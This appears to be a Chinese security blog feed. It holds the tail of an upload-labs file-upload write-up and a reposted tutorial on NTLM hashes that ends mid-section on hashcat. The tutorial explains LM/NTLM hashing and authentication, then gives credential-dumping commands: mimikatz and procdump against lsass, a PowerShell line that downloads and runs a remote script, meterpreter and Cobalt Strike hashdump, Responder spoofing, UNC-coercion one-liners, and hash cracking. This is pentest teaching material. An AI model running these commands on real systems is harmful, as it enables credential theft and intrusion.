<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
<img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ截图20200124131542.png" style="zoom:50%;">

<p><strong>Pass-12 Post 00截断</strong></p>
<p>考察知识点：00截断</p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt></p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt></p>
<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt></p>
<p><img src="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt></p>
<h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul>
<li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li>
</ul>
<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul>
<li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li>
<li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li>
<li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li>
<li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li>
<li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li>
<li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li>
<li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li>
</ul>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透之NTML hash</title>
    <url>/2020/06/05/yu-shen-tou-zhi-ntml-hash/</url>
    <content><![CDATA[<p><strong>转载自:</strong><a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/" target="_blank" rel="noopener">https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/</a></p>
<h2 id="域渗透之NTML-Hash"><a href="#域渗透之NTML-Hash" class="headerlink" title="域渗透之NTML-Hash"></a>域渗透之NTML-Hash</h2><h3 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h3><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了<strong>WindowsNT挑战/响应验证机制</strong>，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p>
<p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串<code>KGS!@#$%</code>。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p>
<h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p>
<p><strong>补充：</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Windows Vista`和`Windows<span class="built_in"> Server </span>2008`以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式`LM hash:NT hash`，可以将LM Hash填0(LM hash可以为任意值)，即`00000000000000000000000000000000:NT hash</span><br></pre></td></tr></table></figure>

<h4 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h4><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p>
<p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p>
<blockquote>
<p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p>
</blockquote>
<p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p>
<p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p>
<p>本地认证流程</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="function"><span class="title">lsass</span>.exe -&gt;</span> (认证)</span><br></pre></td></tr></table></figure>

<p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p>
<ul>
<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>
<li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li>
</ul>
<p>在系统中，hash格式是类似这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</span><br></pre></td></tr></table></figure>

<h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h4><p>用户密码为<code>test123</code></p>
<p>转换成十六进制的格式为<code>74657374313233</code></p>
<p>转换成Unicode格式为<code>7400650073007400310032003300</code></p>
<p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p>
<p><strong>注：</strong></p>
<p>MD4加密可使用工具HashCalc，如下图</p>
<p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p>
<p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p>
<blockquote>
<p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p>
</blockquote>
<p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p>
<p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p>
<p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p>
<p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p>
<blockquote>
<p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p>
</blockquote>
<p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br></pre></td></tr></table></figure>

<h3 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h3><h5 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h5><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于工作组和域环境下<code>登录场景的身份认证</code>。</p>
<h4 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h4><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p>
<p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p>
<blockquote>
<p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p>
</blockquote>
<p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p>
<ul>
<li><strong>协商</strong>：主要用于确认双方协议版本</li>
<li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li>
<li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li>
</ul>
<p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p>
<p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p>
<p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">net use x: \\<span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>\$share /u:administrator password</span><br></pre></td></tr></table></figure>

<p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p>
<p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p>
<p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p>
<blockquote>
<p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，NTML认证机制参与认证过程。此部分详细内容请参考<a href>域渗透之Kerberos</a> 。</p>
</blockquote>
<p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p>
<h4 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h4><p>工作组中，涉及Clinet、Server，流程如下：</p>
<ul>
<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
<li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li>
<li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li>
<li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
</ul>
<h4 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h4><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p>
<blockquote>
<ol>
<li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85).aspx" target="_blank" rel="noopener"><em>hash</em></a> of the password and discards the actual password.</li>
<li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85).aspx" target="_blank" rel="noopener"><em>plaintext</em></a>).</li>
<li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>nonce</em></a>, and sends it to the client.</li>
<li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li>
<li>The server sends the following three items to the domain controller:<ul>
<li>User name</li>
<li>Challenge sent to the client</li>
<li>Response received from the client</li>
</ul>
</li>
<li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li>
<li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li>
</ol>
</blockquote>
<p>翻译过来流程大致如下：</p>
<ol>
<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
<li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li>
<li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li>
<li>服务器将<strong><em>Username、Challenge、Response\</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)\</em></strong></li>
<li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)\</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
</ol>
<h3 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h3><h5 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h5><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p>
<blockquote>
<p>大部分这种本地抓取hash的工具都需要管理员权限</p>
</blockquote>
<p>常用工具：</p>
<ul>
<li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p>
</li>
<li><p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></p>
</li>
<li><p><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></p>
</li>
<li><p><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></p>
</li>
<li><p>Cobaltstrike</p>
</li>
<li><p><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&can=2&q=" target="_blank" rel="noopener">QuarksPwDump</a></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">quarkspwdump.exe -dhl</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>更方便的mimikatz命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords full"</span></span><br></pre></td></tr></table></figure>

<p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span><span class="built_in">log</span> sekurlsa::logonpasswords full<span class="string">""</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li>
</ul>
<p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span></span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span>); <span class="string">"Get-Process lsass | Out-Minidump"</span></span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li>
</ul>
<p>首先需要获取<code>SYSTEM</code>权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>

<p><code>metasploit</code>提供的抓取hash的一些模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>

<p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p>
<p>顺便介绍一些能够直接获取明文密码的模块命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; wdigest （kerberos）</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords </span><br><span class="line"></span><br><span class="line">meterpreter&gt;load kiwi</span><br><span class="line">meterpreter&gt; creds_wdigest</span><br></pre></td></tr></table></figure>

<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">beacon&gt; </span>getuid</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell-<span class="meta">import</span> /root/powershell/<span class="meta">Get</span>-PassHashes.ps1</span><br><span class="line"><span class="keyword">beacon&gt; </span>powershell <span class="meta">Get</span>-PassHashes</span><br></pre></td></tr></table></figure>

<p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; wdigest //读取信息</span><br><span class="line">beacon&gt; hashdump</span><br></pre></td></tr></table></figure>

<p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; logonpasswords</span><br></pre></td></tr></table></figure>

<p>右击受害者主机–access-hashdump</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; powershell-import /root/powershell/Inveigh/Inveigh.ps1</span><br><span class="line">beacon&gt; powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y</span><br></pre></td></tr></table></figure>

<h4 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h4><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p>
<p>常用工具：</p>
<ul>
<li>Responder</li>
<li>Metasploit</li>
</ul>
<h5 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h5><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>

<p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; Servers to start</span><br><span class="line">SQL = Off</span><br><span class="line">SMB = On</span><br><span class="line">Kerberos = On</span><br><span class="line">FTP = Off</span><br><span class="line">POP = Off</span><br><span class="line">SMTP = Off</span><br><span class="line">IMAP = Off</span><br><span class="line">HTTP = On</span><br><span class="line">HTTPS = On</span><br><span class="line">DNS = On</span><br><span class="line">LDAP = On</span><br></pre></td></tr></table></figure>

<p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">Challenge</span> = <span class="number">1122334455667788</span></span><br></pre></td></tr></table></figure>

<p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p>
<p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p>
<p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p>
<ul>
<li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li>
<li>钓鱼文档：doc、docx、pdf</li>
<li>后门设置：</li>
</ul>
<p>例：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">regsvr32 /s /u /i:<span class="comment">//17.10.0.1/@abc hello.dll</span></span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">powershell -nop -exec bypass -c <span class="string">"Invoke-Item \\17.10.0.1\aa"</span></span><br><span class="line">Invoke-Item \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Get-Content \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br><span class="line">Start-Process \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>\aa</span><br></pre></td></tr></table></figure>

<h5 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h5><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p>
<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p>
<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">花式窃取NetNTLM哈希的方法</a></p>
<h3 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h3><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p>
<h4 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h4><h5 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h5><p>下面是一些提供在线解密的站点：</p>
<ul>
<li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li>
<li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li>
<li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li>
<li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li>
<li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li>
</ul>
<h5 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h5><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p>
<h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john HTTP-NTLMv2-17.10.0.10.txt</span><br></pre></td></tr></table></figure>



<h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p>
<p><code>-m</code>  hash类型</p>
